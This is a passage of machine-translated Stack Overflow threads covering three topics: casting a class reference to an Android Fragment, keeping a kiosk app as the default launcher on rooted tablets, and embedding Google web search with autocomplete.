现在我想为这个片段分配一些值，例如：

片段= SomeClass.class。

cani type cast它如何。？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:38:24.290

为什么要将 SomeClass 转换为 Fragment？如果 SomeClass 是 Fragment 的子类，那么您不必将其转换为将引用存储在 Fragment 变量中，只需将其作为 SomeClass 检索。如果 SomeClass 不是 Fragment 的子类，则不应尝试将其强制转换为一个子类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:39:48.693

您可以使用以下语法：fragment= SomeClass.class 如果 SomeClass 扩展了 Fragment。另一种方式：SomeClass可以实现Fragment，那么在代码中：

```
fragment= (Fragment)SomeClass.class 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-27T18:48:45.807

试试这个。这个对我有用。

```
 Class  cur_class_frag = null;
        switch (position) {
                case 1:
                    cur_class_frag =  Some_Fragment_Class.class;
                    cur_frag="recipees";
                    break;
                case 2:
                    cur_class_frag =  Facebook_Fragment_Class.class; //facebok

                    cur_frag="facebook";
                    break;
                case 3:
                    cur_class_frag =  Twitter_Fragment_Class.class;  //twitter
                    cur_frag="twitter";
                   default:
                    break;
                }
android.app.FragmentManager fragmanager = getFragmentManager(); 
        //check if  tag already exists
        Fragment fragment2 = fragmanager.findFragmentByTag(cur_frag);

        if (fragment2 !=null) {
            //remove and add in content frame
            fragmanager.beginTransaction().remove(fragment2).commit();

            fragmanager.beginTransaction()
            //.setCustomAnimations(android.R.animator.fade_in, android.R.animator.fade_out)
            .replace(R.id.content_frame, fragment2,cur_frag)
            .commit();

            }
        else{
            //create it :)

            Fragment frag = null;
            try {
                frag = (Fragment) cur_class_frag.newInstance();
            } catch (InstantiationException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            fragmanager.beginTransaction().add(R.id.content_frame, frag,cur_frag).commit(); 
```

在这里，我正在切换一个菜单位置，从中获取当前片段，如果不存在，则创建它，否则我重新添加它。我也将片段类名称转换为片段。-- 如果该类不存在，我还没有检查过。--所以要小心

# android - 如何在有根设备上将我的应用程序设置为默认值

> ID：10603995
> 
> 赞同：3
> 
> 时间：2012-05-15T15:28:43.997
> 
> 标签：android

我们有一个平板电脑应用程序，我们正在零售店部署。它目前在深夜自我更新，但它不再是默认的“家庭”应用程序，用户可以选择再次启动我们的应用程序或默认启动器。即使在更新之后，我们也希望我们的应用始终成为默认的家庭应用。有没有办法在有根设备上做到这一点？

这是一个基于 ICS 的设备，因此 addPreferredActivity 似乎不起作用，因为即使设备已植根，我也无法获得 android.permission.SET_PREFERRED_APPLICATIONS 权限。如果有办法解决这个问题，我想我可以完成这个..

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-28T23:58:42.520

> 有没有办法在有根设备上做到这一点？

最简单的解决方案是您在评论中拒绝的解决方案：删除库存启动器并让您成为唯一的启动器。

> 这是一个基于 ICS 的设备，因此 addPreferredActivity 似乎不起作用，因为即使设备已植根，我也无法获得 android.permission.SET_PREFERRED_APPLICATIONS 权限。

根本身与权限无关。在这种情况下，`SET_PREFERRED_APPLICATIONS`是签名级别的权限，这意味着您的应用程序必须使用与固件相同的签名密钥进行签名，除非您推出自己的改装 ROM，否则这是不可能的。

如果我正确阅读[了 Android 源代码](http://androidxref.com/source/xref/frameworks/base/services/java/com/android/server/pm/Settings.java)，则结果会`addPreferredActivity()`出现`/data/system/packages.xml`在一个`<preferred-activities>`元素中。**非常仔细地**修改该文件，看看是否能得到你想要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-28T04:45:43.540

有时会发生某些应用程序无法在 root 设备中正常工作我的设备中也有同样的问题（也是 Rooted）。所以我只有一种方法可以再次安装操作系统，所以我使用了一些软件（像superoneclick）并使用它我取消了我的设备并重新安装操作系统。那么该应用程序可以完美运行，所以如果可能的话，您也应该取消您的设备的根目录。

# html - 在自己的主页上具有自动完成功能的原始 Google 网络搜索

> ID：10603997
> 
> 赞同：0
> 
> 时间：2012-05-15T15:28:50.060
> 
> 标签：html, ajax

我想在自己的页面上使用正常的网络搜索和谷歌的自动完成功能。不是自定义搜索！只是像 www.google.com 这样的普通网站。我找不到示例或操作方法。仅适用于 Google 的自定义搜索引擎 (cse)。但这不是我想要的。

任何人都可以提供有关如何执行此操作的链接或 HTML 结构吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:33:25.310

如果没有专门的 API 来做你想做的事，那你就不走运了。例如，Google 的政策不允许您抓取结果页面。从[服务条款](https://www.google.com/intl/en/policies/terms/)：

> (...) 例如，不要干扰我们的服务或尝试使用我们提供的界面和说明以外的方法访问它们。(...)

看起来您应该使用 CSE 或类似的 API 来查询 Google 的搜索结果，或者使用不同的搜索引擎，例如 Yahoo! 的[BOSS](http://developer.yahoo.com/search/boss/#pricing)服务。